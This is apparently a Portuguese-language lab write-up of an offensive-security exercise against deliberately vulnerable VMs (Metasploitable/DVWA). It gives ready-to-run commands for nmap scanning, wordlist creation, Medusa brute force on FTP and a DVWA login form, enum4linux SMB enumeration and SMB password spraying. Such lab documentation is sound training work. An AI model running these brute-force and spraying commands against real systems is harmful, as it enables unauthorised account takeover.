# 🧪 Laboratório Prático de Segurança Ofensiva: Medusa, DVWA & SMB

Este repositório contém a documentação prática de um laboratório de testes de invasão e enumeração realizado em ambiente controlado com máquinas virtuais.

O objetivo principal foi explorar diferentes superfícies de ataque utilizando força bruta e enumeração de credenciais com a ferramenta **Medusa** e **enum4linux**.

---

## 📌 Sumário

* [Visão Geral e Setup](#-visão-geral-e-setup)
* [Etapa 1: Brute Force em Serviço FTP](#1-brute-force-em-serviço-ftp-medusa)
* [Etapa 2: Ataque a Formulário de Login Web (DVWA)](#2-ataque-a-formulário-de-login-web-dvwa)
* [Etapa 3: Enumeração SMB e Password Spraying](#3-enumeração-smb-e-password-spraying)
* [Ferramentas Utilizadas](#-ferramentas-utilizadas)

---

## 🔎 Visão Geral e Setup

O laboratório foi estruturado a partir da preparação de duas máquinas virtuais:
* **Máquina Atacante:** Kali Linux
* **Máquina Alvo:** VM vulnerável (Metasploitable / DVWA)

### Preparação do Ambiente
1. Inicialização das duas máquinas virtuais na mesma rede.
2. Identificação do endereço IP da máquina alvo através de varredura ou consulta de rede.
3. Abertura do terminal no Kali Linux para dar início ao processo de reconhecimento.

---

## 1. Brute Force em Serviço FTP (Medusa)

Após descobrir o IP da máquina alvo, iniciou-se a etapa de mapeamento e varredura das portas mais comuns.

### 1.1 Mapeamento e Varredura
Executou-se o `nmap` para enumerar as portas mais comuns e descobrir quais serviços estavam vulneráveis:

```bash
nmap -sV -p 21,22,80,445,139 IP_DO_ALVO
```

### 1.2 Criação dos Dicionários (Wordlists)
Foram criados os arquivos de usuários (`users.txt`) e senhas (`pass.txt`) para alimentar o Medusa na geração de sequências e combinações válidas de login:

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### 1.3 Execução do Ataque no FTP
Com a porta 21 (FTP) confirmada como aberta, o Medusa foi disparado para realizar o processo de força bruta e descobrir login e senha da máquina alvo:

```bash
medusa -h IP_DO_ALVO -U users.txt -P pass.txt -M ftp -t 4
```

### 1.4 Acesso ao Prompt do FTP
Logo após o Medusa encontrar as credenciais válidas, utilizou-se o comando `ftp` seguido do IP do alvo para digitar o login/senha encontrados e acessar o prompt interativo do FTP:

```bash
ftp IP_DO_ALVO
```

---

## 2. Ataque a Formulário de Login Web (DVWA)

Nesta etapa, o foco foi realizar um ataque em formulários de autenticação de aplicação web.

### 2.1 Análise de Parâmetros Web
1. Acesse o navegador e entre na URL: `http://IP_DO_ALVO/dvwa/login.php`.
2. Pressione `F12` no teclado para abrir a aba de ferramentas do desenvolvedor.
3. Clique na aba **Network** para inspecionar os parâmetros de requisição e entender como o site se comporta ao enviar o formulário.

### 2.2 Reutilização de Wordlists e Ataque HTTP
Utilizando os mesmos arquivos `users.txt` e `pass.txt` criados anteriormente, executou-se o Medusa apontando para o formulário da página:

```bash
medusa -h IP_DO_ALVO -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6
```

---

## 3. Enumeração SMB e Password Spraying

Ataque em cadeia combinando a coleta de dados via SMB com a técnica de Password Spraying.

### 3.1 Coleta de Dados com `enum4linux`
No terminal do Kali, rodou-se o comando `enum4linux` para extrair informações da máquina alvo, utilizando o `tee` para gravar simultaneamente a saída do comando em arquivo:

```bash
enum4linux -a IP_DO_ALVO | tee enum4_output.txt
```

Através dessa etapa, obteve-se acesso detalhado às informações dos alvos (usuários, compartilhamentos e configurações).

### 3.2 Extração da Lista de Usuários
Com a saída gravada em `enum4_output.txt`, filtrou-se a lista de usuários limpa:

```bash
grep -i "user:" enum4_output.txt | awk -F'[' '{print $2}' | cut -d']' -f1 | sort -u > smb_users.txt
```

### 3.3 Execução do Password Spraying
Para evitar o bloqueio de contas por tentativas excessivas em um único usuário, aplicou-se o **Password Spraying**, testando poucas senhas comuns contra a lista de usuários extraída:

```bash
medusa -h IP_DO_ALVO -U smb_users.txt -P spray_pass.txt -M smbnt -t 2
```

---

## 🛠️ Ferramentas Utilizadas

| Ferramenta | Finalidade |
| --- | --- |
| **Nmap** | Enumerar portas mais comuns (21, 22, 80, 445, 139) e descobrir serviços vulneráveis |
| **Medusa** | Executar ataques de força bruta e Password Spraying via FTP, HTTP e SMB |
| **enum4linux** | Realizar enumeração SMB e gravar saída de informações do alvo |
| **FTP Client** | Conectar e acessar o prompt do FTP após descoberta das credenciais |
| **DevTools (F12)** | Inspecionar a aba Network para capturar parâmetros do formulário web |